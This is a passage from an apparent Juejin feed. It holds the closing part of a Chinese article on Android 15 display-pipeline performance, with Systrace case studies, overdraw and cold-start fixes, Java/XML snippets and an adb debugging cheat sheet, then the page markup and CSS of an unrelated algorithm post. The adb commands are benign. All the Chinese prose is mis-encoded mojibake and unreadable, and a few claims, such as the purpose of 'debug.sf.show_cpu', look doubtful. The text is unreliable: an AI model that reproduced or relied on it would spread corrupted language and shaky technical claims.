    <span class="hljs-type">Data</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> items.get(position);
    holder.textView.setText(data.getFormattedText());  <span class="hljs-comment">// é¢„è®¡ç®—ç¼“å­˜</span>
}
</code></pre>
<p><strong>ä¼˜åŒ–æ•ˆæœ</strong>:</p>
<ul>
<li>measureè€—æ—¶: 12.1ms â†’ 3.2ms</li>
<li>æ€»å¸§æ—¶é—´: 16.2ms â†’ 7.5ms</li>
<li>æ‰å¸§ç‡: 35% â†’ 2%</li>
</ul>
<h3 data-id="heading-32">4.4 æ¡ˆä¾‹2: æ»‘åŠ¨å¡é¡¿åˆ†æ</h3>
<p><strong>é—®é¢˜ç°è±¡</strong>:
æŸé¡µé¢åŒ…å«å¤§é‡å›¾ç‰‡,æ»‘åŠ¨æ—¶ä¸¥é‡å¡é¡¿ã€‚</p>
<p><strong>æ­¥éª¤1: Systraceåˆ†æ</strong></p>
<p>å‘ç°RenderThreadçš„<code>flush drawing commands</code>è€—æ—¶ç‰¹åˆ«é•¿(18ms),GPUæ˜¯ç“¶é¢ˆã€‚</p>
<p><strong>æ­¥éª¤2: æ£€æŸ¥Overdraw</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¼€å¯Overdrawæ£€æµ‹</span>
adb shell setprop debug.hwui.overdraw show
</code></pre>
<p>å±å¹•æ˜¾ç¤ºå¤§ç‰‡çº¢è‰²åŒºåŸŸ(4x+è¿‡åº¦ç»˜åˆ¶),é—®é¢˜ç¡®è®¤:å¤§é‡å›¾ç‰‡é‡å ç»˜åˆ¶ã€‚</p>
<p><strong>æ ¹æœ¬åŸå› </strong>:
é¡µé¢ä½¿ç”¨FrameLayoutå †å å¤šå±‚èƒŒæ™¯,æ¯ä¸ªitemåˆæœ‰åŠé€æ˜é®ç½©,å¯¼è‡´ä¸¥é‡Overdrawã€‚</p>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆ</strong>:</p>
<ol>
<li>ç§»é™¤ä¸å¿…è¦çš„èƒŒæ™¯:</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- ä¼˜åŒ–å‰ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span> <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/white"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span> <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@drawable/placeholder"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span>

<span class="hljs-comment">&lt;!-- ä¼˜åŒ–å: ç§»é™¤FrameLayoutèƒŒæ™¯ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span> <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@drawable/placeholder"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span>
</code></pre>
<ol start="2">
<li>ä½¿ç”¨clipRectå‡å°‘ç»˜åˆ¶åŒºåŸŸ:</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDraw</span><span class="hljs-params">(Canvas canvas)</span> {
    <span class="hljs-comment">// åªç»˜åˆ¶å¯è§åŒºåŸŸ</span>
    canvas.clipRect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, getWidth(), getHeight());
    <span class="hljs-built_in">super</span>.onDraw(canvas);
}
</code></pre>
<ol start="3">
<li>ä½¿ç”¨ç¡¬ä»¶å±‚ç¼“å­˜å¤æ‚View:</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯¹äºä¸ç»å¸¸å˜åŒ–çš„å¤æ‚View,ç¼“å­˜ä¸ºçº¹ç†</span>
view.setLayerType(View.LAYER_TYPE_HARDWARE, <span class="hljs-literal">null</span>);
</code></pre>
<p><strong>ä¼˜åŒ–æ•ˆæœ</strong>:</p>
<ul>
<li>Overdraw: 4x+ â†’ 2x</li>
<li>RenderThread flush: 18ms â†’ 5ms</li>
<li>æ»‘åŠ¨å¸§ç‡: 35fps â†’ 58fps</li>
</ul>
<h3 data-id="heading-33">4.5 æ¡ˆä¾‹3: å¯åŠ¨é»‘å±é—®é¢˜æ’æŸ¥</h3>
<p><strong>é—®é¢˜ç°è±¡</strong>:
Appå¯åŠ¨æ—¶,ç™½å±/é»‘å±æŒç»­2ç§’ã€‚</p>
<p><strong>æ­¥éª¤1: Systraceåˆ†æå†·å¯åŠ¨</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯åŠ¨Appå‰å…ˆå¼€å§‹æŠ“trace</span>
python systrace.py gfx view am sm -b 32768 -t 10 -o cold_start.html &amp;
adb shell am start -W com.example.app/.MainActivity
</code></pre>
<p><strong>åˆ†æç»“æœ</strong>:</p>
<pre><code class="hljs language-ini" lang="ini">ActivityManager:
  startActivity                         <span class="hljs-section">[50ms]</span>

App Process (com.example.app):
  bindApplication                       <span class="hljs-section">[1200ms]</span>  âŒ å¯åŠ¨æ…¢
    â”œâ”€ Application.onCreate             <span class="hljs-section">[800ms]</span>   âŒ è¶…æ—¶
    â”‚   â””â”€ åˆå§‹åŒ–ç¬¬ä¸‰æ–¹SDK               <span class="hljs-section">[750ms]</span>   âŒ æ ¹æœ¬åŸå› 
    â””â”€ Activity.onCreate                <span class="hljs-section">[350ms]</span>
        â””â”€ setContentView                <span class="hljs-section">[300ms]</span>

  performTraversals (ç¬¬ä¸€æ¬¡ç»˜åˆ¶)       <span class="hljs-section">[150ms]</span>

SurfaceFlinger:
  createSurface                         <span class="hljs-section">[20ms]</span>

Total cold start time: 1.7s  âŒ
</code></pre>
<p><strong>æ ¹æœ¬åŸå› </strong>:
Application.onCreateä¸­åŒæ­¥åˆå§‹åŒ–äº†å¤šä¸ªç¬¬ä¸‰æ–¹SDK(å¹¿å‘Š/ç»Ÿè®¡/æ¨é€),é˜»å¡ä¸»çº¿ç¨‹ã€‚</p>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆ</strong>:</p>
<ol>
<li>å»¶è¿Ÿåˆå§‹åŒ–éå…³é”®SDK:</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplication</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onCreate();

        <span class="hljs-comment">// å…³é”®SDK: ç«‹å³åˆå§‹åŒ–</span>
        CrashReport.initCrashReport(<span class="hljs-built_in">this</span>);

        <span class="hljs-comment">// éå…³é”®SDK: å»¶è¿Ÿåˆ°é¦–å±ç»˜åˆ¶å®Œæˆå</span>
        Choreographer.getInstance().postFrameCallback(frameTimeNanos -&gt; {
            initNonCriticalSDKs();
        });
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initNonCriticalSDKs</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åå°çº¿ç¨‹åˆå§‹åŒ–</span>
        Executors.newSingleThreadExecutor().execute(() -&gt; {
            initAdSDK();
            initAnalyticsSDK();
            initPushSDK();
        });
    }
}
</code></pre>
<ol start="2">
<li>ä½¿ç”¨å¯åŠ¨çª—å£(Splash Screen)æ”¹å–„æ„ŸçŸ¥:</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- themes.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"AppTheme.Launcher"</span>&gt;</span><span class="xml">
    <span class="hljs-tag">&lt;<span class="hljs-name">item</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"android:windowBackground"</span>&gt;</span>@drawable/launch_screen<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-comment">&lt;!-- AndroidManifest.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">activity</span>
    <span class="hljs-attr">android:name</span>=<span class="hljs-string">".MainActivity"</span>
    <span class="hljs-attr">android:theme</span>=<span class="hljs-string">"@style/AppTheme.Launcher"</span>&gt;</span>
</code></pre>
<p><strong>ä¼˜åŒ–æ•ˆæœ</strong>:</p>
<ul>
<li>Application.onCreate: 800ms â†’ 80ms</li>
<li>æ€»å†·å¯åŠ¨æ—¶é—´: 1.7s â†’ 0.4s</li>
<li>ç”¨æˆ·æ„ŸçŸ¥: é»‘å±2ç§’ â†’ ç«‹å³æ˜¾ç¤ºå“ç‰Œé¡µ</li>
</ul>
<h2 data-id="heading-34">äº”ã€æ˜¾ç¤ºå­ç³»ç»Ÿè°ƒä¼˜æœ€ä½³å®è·µ</h2>
<p>åŸºäºå‰é¢çš„åˆ†æ,æ€»ç»“ä»¥ä¸‹æœ€ä½³å®è·µ:</p>
<h3 data-id="heading-35">5.1 å‡å°‘è¿‡åº¦ç»˜åˆ¶</h3>
<p><strong>ç›®æ ‡</strong>: Overdraw &lt; 2x</p>
<p><strong>æ–¹æ³•</strong>:</p>
<ol>
<li>ç§»é™¤ä¸å¿…è¦çš„èƒŒæ™¯</li>
<li>ä½¿ç”¨<code>&lt;merge&gt;</code>æ ‡ç­¾å‡å°‘å¸ƒå±€å±‚çº§</li>
<li>ä½¿ç”¨clipRectç²¾ç¡®æ§åˆ¶ç»˜åˆ¶åŒºåŸŸ</li>
<li>é¿å…é€æ˜å›¾å±‚å åŠ </li>
</ol>
<p><strong>æ£€æŸ¥å·¥å…·</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">adb shell setprop debug.hwui.overdraw show
</code></pre>
<h3 data-id="heading-36">5.2 ä¼˜åŒ–Layeræ•°é‡</h3>
<p><strong>ç›®æ ‡</strong>: å±å¹•Layeræ•°é‡&lt; 20ä¸ª</p>
<p><strong>æ–¹æ³•</strong>:</p>
<ol>
<li>åˆå¹¶å¤šä¸ªå°Viewä¸ºä¸€ä¸ªè‡ªå®šä¹‰View</li>
<li>ä½¿ç”¨TextureView/SurfaceViewæ›¿ä»£å¤šä¸ªæ™®é€šView(è§†é¢‘/æ¸¸æˆåœºæ™¯)</li>
<li>é¿å…ä¸å¿…è¦çš„Viewå±‚çº§</li>
</ol>
<p><strong>æ£€æŸ¥å·¥å…·</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">adb shell dumpsys SurfaceFlinger --list | <span class="hljs-built_in">wc</span> -l
</code></pre>
<h3 data-id="heading-37">5.3 åˆç†ä½¿ç”¨ç¡¬ä»¶åŠ é€Ÿ</h3>
<p><strong>æ–¹æ³•</strong>:</p>
<ol>
<li>é»˜è®¤å¼€å¯ç¡¬ä»¶åŠ é€Ÿ(Android 15é»˜è®¤è¡Œä¸º)</li>
<li>å¯¹äºä¸æ”¯æŒç¡¬ä»¶åŠ é€Ÿçš„ç»˜åˆ¶æ“ä½œ(å¦‚æ–‡å­—è·¯å¾„),ä½¿ç”¨è½¯ä»¶å±‚:</li>
</ol>
<pre><code class="hljs language-java" lang="java">view.setLayerType(View.LAYER_TYPE_SOFTWARE, <span class="hljs-literal">null</span>);
</code></pre>
<ol start="3">
<li>å¯¹äºé™æ€å¤æ‚View,ä½¿ç”¨ç¡¬ä»¶å±‚ç¼“å­˜:</li>
</ol>
<pre><code class="hljs language-java" lang="java">view.setLayerType(View.LAYER_TYPE_HARDWARE, <span class="hljs-literal">null</span>);
<span class="hljs-comment">// æ›´æ–°åæ¸…é™¤ç¼“å­˜</span>
view.setLayerType(View.LAYER_TYPE_NONE, <span class="hljs-literal">null</span>);
</code></pre>
<h3 data-id="heading-38">5.4 é¿å…UIçº¿ç¨‹è€—æ—¶æ“ä½œ</h3>
<p><strong>æ–¹æ³•</strong>:</p>
<ol>
<li>ç½‘ç»œ/IOæ“ä½œå¿…é¡»åœ¨åå°çº¿ç¨‹</li>
<li>å¤æ‚è®¡ç®—ä½¿ç”¨AsyncTask/Kotlin Coroutines</li>
<li>RecyclerViewé¢„åŠ è½½å’Œç¼“å­˜</li>
<li>å›¾ç‰‡åŠ è½½ä½¿ç”¨Glide/Coilç­‰åº“(è‡ªåŠ¨ç®¡ç†çº¿ç¨‹)</li>
</ol>
<h3 data-id="heading-39">5.5 Android 15æ–°ç‰¹æ€§çš„åº”ç”¨å»ºè®®</h3>
<p><strong>1. åˆ©ç”¨åŠ¨æ€åˆ·æ–°ç‡</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é’ˆå¯¹é™æ€å†…å®¹,è¯·æ±‚é™ä½åˆ·æ–°ç‡</span>
<span class="hljs-type">Surface</span> <span class="hljs-variable">surface</span> <span class="hljs-operator">=</span> getSurface();
surface.setFrameRate(<span class="hljs-number">30.0f</span>, Surface.FRAME_RATE_COMPATIBILITY_DEFAULT);

<span class="hljs-comment">// é’ˆå¯¹æ¸¸æˆ,è¯·æ±‚é«˜åˆ·æ–°ç‡</span>
surface.setFrameRate(<span class="hljs-number">120.0f</span>, Surface.FRAME_RATE_COMPATIBILITY_DEFAULT);
</code></pre>
<p><strong>2. ä½¿ç”¨æœ€æ–°çš„Graphics API</strong></p>
<ul>
<li>ä¼˜å…ˆä½¿ç”¨Vulkanæ›¿ä»£OpenGL ES(æ¸¸æˆåœºæ™¯)</li>
<li>ä½¿ç”¨RenderEffect APIå®ç°é«˜æ€§èƒ½æ¨¡ç³Šæ•ˆæœ</li>
<li>ä½¿ç”¨PixelCopy APIé«˜æ•ˆæˆªå›¾</li>
</ul>
<p><strong>3. å¯ç”¨Canvasç°ä»£åŒ–</strong></p>
<p>Android 15çš„Canvas APIç»è¿‡é‡å†™,æ€§èƒ½æå‡30%+:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªåŠ¨å¯ç”¨(Android 15é»˜è®¤)</span>
<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å¯ç”¨</span>
<span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="hljs-number">35</span>) {
    Log.i(TAG, <span class="hljs-string">"Using modernized Canvas implementation"</span>);
}
</code></pre>
<h2 data-id="heading-40">æ€»ç»“</h2>
<p>æœ¬æ–‡æ·±å…¥åˆ†æäº†Android 15æ˜¾ç¤ºç³»ç»Ÿçš„VsyncåŒæ­¥æœºåˆ¶å’Œæ€§èƒ½ä¼˜åŒ–:</p>
<ol>
<li><strong>Vsyncæ˜¯æ˜¾ç¤ºç³»ç»Ÿçš„å¿ƒè·³</strong>,åè°ƒåº”ç”¨ç»˜åˆ¶ã€ç³»ç»Ÿåˆæˆã€å±å¹•æ˜¾ç¤ºä¸‰ä¸ªç¯èŠ‚</li>
<li><strong>ç¡¬ä»¶Vsyncå’Œè½¯ä»¶Vsyncç»“åˆ</strong>,åœ¨å‡†ç¡®æ€§å’Œæ€§èƒ½ä¹‹é—´å–å¾—å¹³è¡¡</li>
<li><strong>Phase Offsetæœºåˆ¶</strong>è®©åº”ç”¨æå‰æ”¶åˆ°Vsync,æœ‰æ›´å¤šæ—¶é—´ç»˜åˆ¶</li>
<li><strong>Choreographeræ˜¯åº”ç”¨ä¾§ä¸Vsyncçš„æ¡¥æ¢</strong>,åè°ƒè¾“å…¥ã€åŠ¨ç”»ã€ç»˜åˆ¶çš„æ‰§è¡Œæ—¶æœº</li>
<li><strong>ä¸‰é‡ç¼“å†²é€šè¿‡å¢åŠ ä¸€ä¸ªBuffer</strong>,å½»åº•è§£å†³åŒç¼“å†²çš„ç­‰å¾…é—®é¢˜,ä»£ä»·æ˜¯å†…å­˜å¢åŠ 33%</li>
<li><strong>Systrace/Perfettoæ˜¯æ€§èƒ½åˆ†æçš„æœ€å¼ºå·¥å…·</strong>,å¯ä»¥å®Œæ•´å±•ç¤ºæ¸²æŸ“ç®¡çº¿çš„æ¯ä¸ªç¯èŠ‚</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–çš„å…³é”®æ˜¯å®šä½ç“¶é¢ˆ</strong>:UI Thread/RenderThread/SurfaceFlinger,å¯¹ç—‡ä¸‹è¯</li>
</ol>
<p>æŒæ¡è¿™äº›åŸç†å’Œå·¥å…·,å°±èƒ½å¤Ÿ:</p>
<ul>
<li>è¯Šæ–­å’Œè§£å†³å„ç±»æ˜¾ç¤ºæ€§èƒ½é—®é¢˜</li>
<li>æ„å»ºæµç•…çš„ç”¨æˆ·ä½“éªŒ(ç¨³å®š60fps+)</li>
<li>åœ¨æ€§èƒ½å’ŒåŠŸè€—ä¹‹é—´å–å¾—æœ€ä¼˜å¹³è¡¡</li>
<li>ä¸ºåç»­çš„æ·±åº¦ä¼˜åŒ–å’Œé—®é¢˜æ’æŸ¥æ‰“ä¸‹åšå®åŸºç¡€</li>
</ul>
<h2 data-id="heading-41">å‚è€ƒèµ„æº</h2>
<h3 data-id="heading-42">æºç è·¯å¾„(AOSP 15)</h3>
<pre><code class="hljs language-bash" lang="bash">frameworks/native/services/surfaceflinger/Scheduler/  <span class="hljs-comment"># Vsyncè°ƒåº¦</span>
frameworks/base/core/java/android/view/Choreographer.java  <span class="hljs-comment"># Choreographer</span>
frameworks/native/libs/gui/BufferQueue*.cpp  <span class="hljs-comment"># BufferQueue</span>
</code></pre>
<h3 data-id="heading-43">å®˜æ–¹æ–‡æ¡£</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsource.android.com%2Fdocs%2Fcore%2Fgraphics%2Farchitecture" target="_blank" title="https://source.android.com/docs/core/graphics/architecture" ref="nofollow noopener noreferrer">Graphics Architecture</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Fperformance%2Fvitals%2Frender" target="_blank" title="https://developer.android.com/topic/performance/vitals/render" ref="nofollow noopener noreferrer">Slow rendering</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Fperformance%2Frendering%2Finspect-gpu-rendering" target="_blank" title="https://developer.android.com/topic/performance/rendering/inspect-gpu-rendering" ref="nofollow noopener noreferrer">Profile GPU rendering</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Fperformance%2Ftracing" target="_blank" title="https://developer.android.com/topic/performance/tracing" ref="nofollow noopener noreferrer">Systrace</a></li>
</ul>
<h3 data-id="heading-44">æ¨èé˜…è¯»</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fplaylist%3Flist%3DPLWz5rJ2EKKc9CBxr3BVjPTPoDPLdPIFCE" target="_blank" title="https://www.youtube.com/playlist?list=PLWz5rJ2EKKc9CBxr3BVjPTPoDPLdPIFCE" ref="nofollow noopener noreferrer">Android Performance Patterns</a></li>
</ul>
<h3 data-id="heading-45">è°ƒè¯•å‘½ä»¤é€ŸæŸ¥</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># GPUå‘ˆç°æ¨¡å¼</span>
adb shell setprop debug.hwui.profile <span class="hljs-literal">true</span>

<span class="hljs-comment"># Overdrawæ£€æµ‹</span>
adb shell setprop debug.hwui.overdraw show

<span class="hljs-comment"># SystraceæŠ“å–</span>
python systrace.py gfx view <span class="hljs-built_in">sched</span> freq -b 32768 -t 5 -o trace.html

<span class="hljs-comment"># æŸ¥çœ‹å¸§ç‡ç»Ÿè®¡</span>
adb shell dumpsys gfxinfo &lt;package&gt;

<span class="hljs-comment"># æŸ¥çœ‹SurfaceFlingerçŠ¶æ€</span>
adb shell dumpsys SurfaceFlinger

<span class="hljs-comment"># æŸ¥çœ‹Vsyncä¿¡æ¯</span>
adb shell dumpsys SurfaceFlinger --vsync-info

<span class="hljs-comment"># å¼ºåˆ¶GPUåˆæˆ</span>
adb shell setprop debug.sf.disable_hwc 1

<span class="hljs-comment"># æ˜¾ç¤ºVsyncä¿¡æ¯</span>
adb shell setprop debug.sf.show_cpu 1
</code></pre>
<hr/>
<h3 data-id="heading-46">ç³»åˆ—æ–‡ç« </h3>
<ul>
<li><a href="https://juejin.cn/post/7596187471773499401" target="_blank" title="https://juejin.cn/post/7596187471773499401">ä¸Šä¸€ç¯‡ï¼šAndroid 15 æ˜¾ç¤ºå­ç³»ç»Ÿæ·±åº¦è§£æ(äºŒ)ï¼šå›¾å½¢ç¼“å†²åŒºç®¡ç†ä¸HWCç¡¬ä»¶åˆæˆ</a></li>
</ul>
<hr/>
<p><em>æ¬¢è¿æ¥æˆ‘ä¸­çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µ</a>æ‰¾åˆ°æ›´å¤šæœ‰ç”¨çš„çŸ¥è¯†å’Œæœ‰è¶£çš„äº§å“</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰‘æŒ‡offer-65ã€çŸ©é˜µä¸­çš„è·¯å¾„]]></title>    <link>https://juejin.cn/post/7596906473306865714</link>    <guid>https://juejin.cn/post/7596906473306865714</guid>    <pubDate>2026-01-20T00:16:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906473306865714" data-draft-id="7595873251165274153" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" å‰‘æŒ‡offer-65ã€çŸ©é˜µä¸­çš„è·¯å¾„"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-20T00:16:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SevenCoding"/> <meta itemprop="url" content="https://juejin.cn/user/3261615728242467"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             å‰‘æŒ‡offer-65ã€çŸ©é˜µä¸­çš„è·¯å¾„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3261615728242467/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SevenCoding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:16:37.000Z" title="Tue Jan 20 2026 00:16:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é¢˜ç›®æè¿°</h2>
